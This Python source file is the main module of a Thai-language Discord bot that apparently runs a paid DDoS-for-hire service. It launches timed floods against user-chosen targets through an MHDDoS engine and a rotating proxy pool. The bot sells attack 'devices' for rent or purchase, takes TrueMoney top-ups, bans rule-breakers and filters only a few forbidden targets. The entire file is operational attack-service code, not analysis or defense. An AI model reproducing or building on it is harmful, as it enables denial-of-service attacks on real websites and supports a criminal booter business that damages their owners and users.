import asyncio
import ipaddress
import os
import re
import signal
import time
import traceback
from urllib.parse import urlparse

import aiohttp
import discord
from discord.ext import commands, tasks

from config import (
    BASE_DIR, BOT_TOKEN, PREFIX, OWNER_ID, LOG_CHANNEL_ID,
    MAX_DURATION, MAX_DEVICES_PURCHASE, MAX_WARNINGS,
    MAX_RESPAWN_ATTEMPTS,
    FORBIDDEN_TLDS, FORBIDDEN_IPS,
    SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE,
)
from database import Database
from mhddos_engine import MHDDoSEngine, L4_MODULES
from proxy_manager import ProxyManager
from truemoney import TrueMoneyClient
from ui_components import (
    AttackPanel, build_attack_embed, build_module_embed,
    build_attack_running_embed, ModuleView,
    ShopView, build_shop_embed, DeviceTypeView, PeriodView, QuantityView,
    RENT_PRICES, BUY_PRICES, RENT_SECONDS,
    ASSET_ATTACK_BANNER, ASSET_ATTACK_RUNNING, ASSET_SHOP_BANNER,
)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)
db = Database()
engine = MHDDoSEngine()
proxy_mgr = ProxyManager()
tm = TrueMoneyClient()

active_attacks: dict[int, dict] = {}

_http: aiohttp.ClientSession | None = None

_proxy_loop_started = False
_views_registered = False


async def http() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=5)
        )
    return _http


# ============================================================
# Helpers
# ============================================================
def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID


def _extract_host(target: str) -> str:
    t = target.strip().lower()
    if "://" in t:
        return urlparse(t).hostname or ""
    if t.startswith("["):
        end = t.find("]")
        if end > 0:
            return t[1:end]
    return t.split("/")[0].split(":")[0]


def is_forbidden(target: str) -> bool:
    host = _extract_host(target)
    if not host:
        return False
    if any(host == tld.lstrip(".") or host.endswith(tld)
           for tld in FORBIDDEN_TLDS):
        return True
    try:
        ip = ipaddress.ip_address(host)
        if (ip.is_private or ip.is_loopback
                or ip.is_link_local or ip.is_reserved):
            return True
    except ValueError:
        pass
    return host in FORBIDDEN_IPS


def _file(path: str) -> discord.File | None:
    if path and os.path.exists(path):
        return discord.File(path, filename=os.path.basename(path))
    return None


# ============================================================
# Tasks
# ============================================================
@tasks.loop(minutes=1)
async def rental_watchdog():
    try:
        expired = await db.pop_expired_rentals()
    except asyncio.CancelledError:
        raise
    except Exception as e:
        print(f"[watchdog] {e}")
        traceback.print_exc()
        return
    for r in expired:
        user = bot.get_user(r["user_id"])
        if user:
            try:
                await user.send(
                    f"⏰ ยศเช่าหมดอายุ — ลบ {r['devices']} device แล้ว"
                )
            except (discord.Forbidden, discord.HTTPException):
                pass


# ============================================================
# Events
# ============================================================
@bot.event
async def on_ready():
    global _http, _proxy_loop_started, _views_registered

    os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "assets"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "data", "attack_logs"), exist_ok=True)
    await db.init()
    print(f"[VANTA] logged in as {bot.user}")

    if _http is None or _http.closed:
        _http = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=5)
        )

    if not _proxy_loop_started:
        asyncio.create_task(proxy_mgr.auto_refresh_loop())
        _proxy_loop_started = True

    if not _views_registered:
        bot.add_view(AttackPanel(OWNER_ID))
        bot.add_view(ShopView())
        _views_registered = True

    if not rental_watchdog.is_running():
        rental_watchdog.start()


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MemberNotFound):
        await ctx.send("หา member ไม่เจอ")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"ใช้: `!{ctx.command.name} {error.param.name}`")
    elif isinstance(error, commands.CommandNotFound):
        pass
    elif isinstance(error, commands.CommandInvokeError):
        print(f"[cmd invoke] {error.original}")
        traceback.print_exception(
            type(error.original), error.original, error.original.__traceback__
        )
    else:
        print(f"[cmd error] {error}")
        traceback.print_exception(type(error), error, error.__traceback__)


# ============================================================
# Setup commands
# ============================================================
@bot.command(name="ddos", aliases=["setup"])
async def ddos_panel(ctx):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงถุ้ย")
        return
    f = _file(ASSET_ATTACK_BANNER)
    kwargs = {"embed": build_attack_embed(with_image=bool(f)),
              "view": AttackPanel(OWNER_ID)}
    if f:
        kwargs["file"] = f
    await ctx.send(**kwargs)


@bot.command(name="shop")
async def shop_panel(ctx):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    f = _file(ASSET_SHOP_BANNER)
    kwargs = {"embed": build_shop_embed(with_image=bool(f)),
              "view": ShopView()}
    if f:
        kwargs["file"] = f
    await ctx.send(**kwargs)


@bot.command(name="proxy")
async def proxy_status(ctx):
    if not is_owner(ctx.author.id):
        return
    pool = len(proxy_mgr.proxies or [])
    ready = "✅" if proxy_mgr.ready.is_set() else "⏳ กำลังโหลด"
    await ctx.send(f"**Proxy pool:** {pool} live {ready}")


# ============================================================
# Attack flow
# ============================================================
async def handle_attack_submit(interaction: discord.Interaction, modal):
    user_id = interaction.user.id

    if not is_owner(user_id):
        await interaction.response.send_message(
            "ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงถุ้ย", ephemeral=True
        )
        return

    user = await db.get_user(user_id)
    if not user:
        await interaction.response.send_message(
            "DB error — ลองอีกครั้ง", ephemeral=True
        )
        return

    if user["banned"]:
        await interaction.response.send_message(
            "มึงโดนแบนอยู่ ใช้บอทไม่ได้ — ติดต่อเจ้าของบอท", ephemeral=True
        )
        return

    target = modal.target.value.strip()
    try:
        port = int(modal.port.value)
        duration = min(int(modal.duration.value), MAX_DURATION)
        devices = int(modal.device.value)
    except ValueError:
        await interaction.response.send_message(
            "ใส่ตัวเลขให้ถูกต้อง (Port / Time / Device)", ephemeral=True
        )
        return

    if port < 1 or port > 65535:
        await interaction.response.send_message(
            "Port ต้องอยู่ระหว่าง 1-65535", ephemeral=True
        )
        return

    if duration < 1:
        await interaction.response.send_message(
            "Time ต้องมากกว่า 0", ephemeral=True
        )
        return

    if devices < 1 or devices > user["devices"]:
        await interaction.response.send_message(
            f"มีDevice ไม่พอนะ ไปซื้อเพิ่มด้วย (มี {user['devices']} เครื่อง)",
            ephemeral=True,
        )
        return

    if is_forbidden(target):
        warns = await db.add_warning(user_id)
        if warns >= MAX_WARNINGS:
            await interaction.response.send_message(
                "อย่ายิงเว็บต้องห้ามอ่านด้วยอีโง่ — ครบ 3 ครั้ง **โดนแบนแล้ว**",
                ephemeral=True,
            )
        else:
            await interaction.response.send_message(
                f"อย่ายิงเว็บต้องห้ามอ่านด้วยอีโง่ เตือนรอบ {warns}",
                ephemeral=True,
            )
        return

    view = ModuleView(user_id, target, port, duration, devices)
    await interaction.response.send_message(
        embed=build_module_embed(), view=view, ephemeral=True
    )


async def start_attack(interaction: discord.Interaction, module: str,
                       target: str, port: int, duration: int, devices: int):
    user_id = interaction.user.id

    if engine.is_running(user_id):
        await interaction.response.send_message(
            "มึงมี attack รันอยู่แล้ว", ephemeral=True
        )
        return

    # defer แบบ ephemeral — ทั้ง flow ซ่อน 2 ต่อ 2
    await interaction.response.defer(ephemeral=True)

    # รอ proxy pool — max 30 วิ
    if not proxy_mgr.ready.is_set():
        try:
            await asyncio.wait_for(proxy_mgr.ready.wait(), timeout=30)
        except asyncio.TimeoutError:
            pass

    # เตรียม proxy slices
    sub_nodes = devices * SUB_NODES_PER_DEVICE
    slices = proxy_mgr.slice_for_subnodes(sub_nodes)
    pool_size = len(proxy_mgr.proxies or [])

    # spawn
    try:
        nodes = await engine.start(user_id, module, target,
                                    port, duration, devices, slices)
    except Exception as e:
        await interaction.followup.send(
            f"เริ่มไม่สำเร็จ: {e}", ephemeral=True
        )
        return

    try:
        await db.log_attack(user_id, target, port, duration, module)
    except Exception:
        traceback.print_exc()

    f = _file(ASSET_ATTACK_RUNNING)
    embed = build_attack_running_embed(
        target=f"{target}:{port}", time_left=duration,
        speed="measuring...", module=module,
        nodes=f"{len(nodes)}/{len(nodes)}",
        proxies=str(pool_size),
        with_image=bool(f),
    )
    kwargs = {"embed": embed, "ephemeral": True}
    if f:
        kwargs["file"] = f
    try:
        msg = await interaction.followup.send(**kwargs)
    except Exception as e:
        await engine.stop(user_id)
        traceback.print_exc()
        return

    state = {
        "target": target, "port": port, "duration": duration,
        "module": module, "devices": devices,
        "start": time.time(), "message": msg,
        "has_image": bool(f),
        "total_nodes": len(nodes),
        "pool_size": pool_size,
    }
    active_attacks[user_id] = state
    task = asyncio.create_task(_attack_loop(user_id, state))
    state["task"] = task
    # เปิด watcher สำหรับ respawn
    asyncio.create_task(engine._watcher(user_id))


async def _attack_loop(user_id: int, state: dict):
    msg: discord.WebhookMessage = state["message"]
    target_full = f"{state['target']}:{state['port']}"
    duration = state["duration"]
    is_l4 = state["module"] in L4_MODULES

    try:
        while True:
            elapsed = time.time() - state["start"]
            left = max(0, duration - int(elapsed))

            # ครบเวลา → success
            if left <= 0:
                await engine.stop(user_id)
                active_attacks.pop(user_id, None)
                try:
                    await msg.edit(embed=discord.Embed(
                        title="✅ จบการโจมตี",
                        color=discord.Color.green(),
                        description=f"ยิง `{target_full}` ครบ {duration}s แล้ว",
                    ))
                except discord.HTTPException:
                    pass
                return

            # นับ alive
            alive, total = engine.alive_count(user_id)

            # ตายหมดจริงๆ (respawn เกิน limit แล้ว)
            if alive == 0 and total > 0:
                engine.running.pop(user_id, None)
                active_attacks.pop(user_id, None)
                try:
                    await msg.edit(embed=discord.Embed(
                        title="⚠️ Attack หยุดกลางทาง",
                        description=(
                            f"ทุก node respawn เกิน "
                            f"{MAX_RESPAWN_ATTEMPTS} ครั้ง"
                        ),
                        color=discord.Color.orange(),
                    ))
                except discord.HTTPException:
                    pass
                return

            # update
            if is_l4:
                speed = "N/A (L4)"
            else:
                speed = await _measure_speed(state["target"], state["port"])

            embed = build_attack_running_embed(
                target=target_full, time_left=left,
                speed=speed, module=state["module"],
                nodes=f"{alive}/{total}",
                proxies=str(state["pool_size"]),
                with_image=state["has_image"],
            )
            try:
                await msg.edit(embed=embed)
            except discord.NotFound:
                await engine.stop(user_id)
                active_attacks.pop(user_id, None)
                return
            except discord.HTTPException:
                pass

            await asyncio.sleep(1)

    except asyncio.CancelledError:
        try:
            await engine.stop(user_id)
        except Exception:
            pass
        active_attacks.pop(user_id, None)
        raise
    except Exception:
        traceback.print_exc()
        try:
            await engine.stop(user_id)
        except Exception:
            pass
        active_attacks.pop(user_id, None)


async def _measure_speed(target: str, port: int) -> str:
    if target.startswith("http"):
        url = target
    else:
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{target}:{port}"
    try:
        start = time.time()
        s = await http()
        async with s.get(url) as r:
            data = await r.read()
        elapsed = max(0.001, time.time() - start)
        ms = int(elapsed * 1000)
        kbps = (len(data) / 1024) / elapsed
        return f"{ms}ms / {kbps:.1f} KB/s"
    except asyncio.CancelledError:
        raise
    except Exception:
        return "offline / timeout"


# ============================================================
# !device / !b / !ub
# ============================================================
@bot.command(name="device")
async def device_cmd(ctx, member: discord.Member = None,
                     amount: str = None, duration: str = "TH"):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    if member is None or amount is None:
        await ctx.send("ใช้: `!device @user +1 1h` (TH = ถาวร)")
        return

    sign = 1 if amount.startswith("+") else -1 if amount.startswith("-") else 1
    try:
        num = int(re.sub(r"[^0-9]", "", amount) or "0")
    except ValueError:
        await ctx.send("จำนวนไม่ถูกต้อง")
        return
    if num <= 0:
        await ctx.send("จำนวนต้องมากกว่า 0")
        return

    if sign < 0:
        await db.clear_rentals(member.id, num)
        new = await db.add_devices(member.id, -num)
        await ctx.send(f"ลบ {num} device จาก {member.mention} — เหลือ {new}")
        return

    new = await db.add_devices(member.id, num)
    if duration.upper() == "TH":
        await ctx.send(
            f"เพิ่ม {num} device ให้ {member.mention} (ถาวร) — รวม {new}"
        )
        return

    dur_lower = duration.lower()
    try:
        if dur_lower.endswith("m"):
            secs = int(dur_lower[:-1]) * 60
        elif dur_lower.endswith("h"):
            secs = int(dur_lower[:-1]) * 3600
        elif dur_lower.endswith("d"):
            secs = int(dur_lower[:-1]) * 86400
        else:
            await ctx.send("รูปแบบเวลา: 30m / 1h / 1d / TH")
            return
    except ValueError:
        await ctx.send("รูปแบบเวลา: 30m / 1h / 1d / TH")
        return

    if secs <= 0:
        await ctx.send("เวลาต้องมากกว่า 0")
        return

    expires_at = int(time.time()) + secs
    await db.add_rental(member.id, num, expires_at)
    await ctx.send(
        f"เพิ่ม {num} device ให้ {member.mention} ({duration}) — รวม {new}"
    )


@bot.command(name="b")
async def ban_cmd(ctx, member: discord.Member):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    await db.set_ban(member.id, True)
    await ctx.send(f"แบน {member.mention} แล้ว")


@bot.command(name="ub")
async def unban_cmd(ctx, member: discord.Member):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    await db.set_ban(member.id, False)
    await ctx.send(f"ปลดแบน {member.mention} แล้ว")


# ============================================================
# Shop flows
# ============================================================
async def shop_device_type_selected(interaction: discord.Interaction,
                                    mode: str):
    if mode == "rent":
        await interaction.response.edit_message(
            content="เลือกช่วงเวลา:", embed=None, view=PeriodView()
        )
    else:
        await interaction.response.edit_message(
            content="เลือกจำนวน:", embed=None, view=QuantityView("buy")
        )


async def shop_period_selected(interaction: discord.Interaction, period: str):
    await interaction.response.edit_message(
        content=f"เลือกจำนวน (เช่า {period}):",
        embed=None, view=QuantityView("rent", period),
    )


async def shop_quantity_selected(interaction: discord.Interaction, mode: str,
                                 period: str | None, qty: int):
    user_id = interaction.user.id
    user = await db.get_user(user_id)
    if not user:
        await interaction.response.edit_message(
            content="DB error", view=None
        )
        return

    if mode == "rent":
        if period is None:
            await interaction.response.edit_message(
                content="ไม่พบช่วงเวลา", view=None
            )
            return
        price = RENT_PRICES.get(period, {}).get(qty)
    else:
        price = BUY_PRICES.get(qty)

    if price is None:
        await interaction.response.edit_message(
            content="ไม่พบราคา", view=None
        )
        return

    if user["balance"] < price:
        await interaction.response.edit_message(
            content=f"เงินไม่พอ (มี {user['balance']:.0f}💵 ต้องใช้ {price}💵)",
            view=None,
        )
        return

    if mode == "buy" and user["devices"] + qty > MAX_DEVICES_PURCHASE:
        await interaction.response.edit_message(
            content=f"ซื้อไม่เกิน {MAX_DEVICES_PURCHASE} device "
                    f"(มีอยู่ {user['devices']})",
            view=None,
        )
        return

    await db.add_balance(user_id, -price, "purchase",
                         f"{mode} {qty} {period or ''}")
    new_dev = await db.add_devices(user_id, qty)

    if mode == "rent":
        secs = RENT_SECONDS.get(period, 0)
        if secs:
            await db.add_rental(user_id, qty, int(time.time()) + secs)

    new_bal = (await db.get_user(user_id))["balance"]

    try:
        await interaction.user.send(
            f"ซื้อสำเร็จ! ได้ {qty} device — รวม {new_dev} device\n"
            f"เงินเหลือ {new_bal:.0f}💵"
        )
    except discord.Forbidden:
        pass

    await interaction.response.edit_message(
        content=f"ซื้อสำเร็จ {qty} device — เหลือเงิน {new_bal:.0f}💵",
        view=None,
    )

    log = bot.get_channel(LOG_CHANNEL_ID)
    if log:
        try:
            await log.send(
                f"🛒 **{interaction.user}** {mode} {qty} device "
                f"({period or 'buy'}) — {price}💵 — เหลือ {new_bal:.0f}💵"
            )
        except discord.HTTPException:
            pass


# ============================================================
# Topup
# ============================================================
async def process_topup(interaction: discord.Interaction, link: str):
    await interaction.response.defer(ephemeral=True)
    user_id = interaction.user.id

    result = await tm.redeem(link)
    if not result["success"]:
        await interaction.followup.send(
            "รับซองไม่สำเร็จ — เช็คลิงก์อีกครั้ง", ephemeral=True
        )
        return

    amount = result["amount"]
    new_bal = await db.add_balance(user_id, amount, "topup", link)
    user = await db.get_user(user_id)
    if user:
        await db.update_user(
            user_id, total_deposited=user["total_deposited"] + amount
        )

    await interaction.followup.send(
        f"เติม {amount:.0f}💵 สำเร็จ — เหลือ {new_bal:.0f}💵",
        ephemeral=True,
    )

    log = bot.get_channel(LOG_CHANNEL_ID)
    if log:
        try:
            await log.send(
                f"💰 **{interaction.user}** เติม {amount:.0f}💵 "
                f"— เหลือ {new_bal:.0f}💵"
            )
        except discord.HTTPException:
            pass


@bot.command(name="topup")
async def topup_cmd(ctx, link: str = None):
    if not link:
        await ctx.send("ใช้: `!topup <ลิงก์ซองทรูมันนี่>`")
        return

    result = await tm.redeem(link)
    if not result["success"]:
        await ctx.send("รับซองไม่สำเร็จ — ตรวจสอบลิงก์อีกครั้ง")
        return

    user_id = ctx.author.id
    amount = result["amount"]
    new_bal = await db.add_balance(user_id, amount, "topup", link)
    user = await db.get_user(user_id)
    if user:
        await db.update_user(
            user_id, total_deposited=user["total_deposited"] + amount
        )

    await ctx.send(f"เติมเงินสำเร็จ {amount:.0f}💵 — เหลือ {new_bal:.0f}💵")

    log = bot.get_channel(LOG_CHANNEL_ID)
    if log:
        try:
            await log.send(
                f"💰 **{ctx.author}** เติม {amount:.0f}💵 — เหลือ {new_bal:.0f}💵"
            )
        except discord.HTTPException:
            pass


# ============================================================
# Signal handler
# ============================================================
def _install_signal_handlers():
    def _shutdown(sig, frame):
        print(f"\n[VANTA] signal {sig} received — shutting down")
        for uid, nodes in list(engine.running.items()):
            for node in nodes:
                proc = node["proc"]
                if proc.returncode is None:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
        raise SystemExit(0)

    try:
        signal.signal(signal.SIGINT, _shutdown)
        signal.signal(signal.SIGTERM, _shutdown)
    except ValueError:
        pass


# ============================================================
# Run
# ============================================================
if __name__ == "__main__":
    if not BOT_TOKEN or BOT_TOKEN.startswith("ใส่_"):
        raise SystemExit(
            "❌ BOT_TOKEN ยังไม่ได้ตั้ง — export BOT_TOKEN='...' ก่อนรัน"
        )
    os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "assets"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "data", "attack_logs"), exist_ok=True)
    _install_signal_handlers()
    bot.run(BOT_TOKEN)